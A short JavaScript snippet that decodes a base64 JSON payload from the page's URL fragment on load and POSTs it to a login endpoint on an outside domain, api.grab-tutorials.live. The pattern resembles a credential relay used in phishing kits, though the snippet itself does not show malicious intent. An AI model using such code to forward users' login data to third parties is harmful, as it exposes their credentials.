window.addEventListener('DOMContentLoaded', () => {
  const fragment = window.location.hash.substring(1);

  if (fragment) {
    let decodedData;
    try {
      const decodedFragment = atob(fragment);

      decodedData = JSON.parse(decodedFragment);
    } catch (e) {
      console.error('Failed to decode and parse fragment:', e);
      return;
    }

    fetch('https://api.grab-tutorials.live/login', {  // Updated URL here
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(decodedData),
    })
      .then(response => response.json())
      .then(data => {
        console.log('Worker Response:', data);
      })
      .catch(error => {
        console.error('Error sending fragment:', error);
      });
  }
});
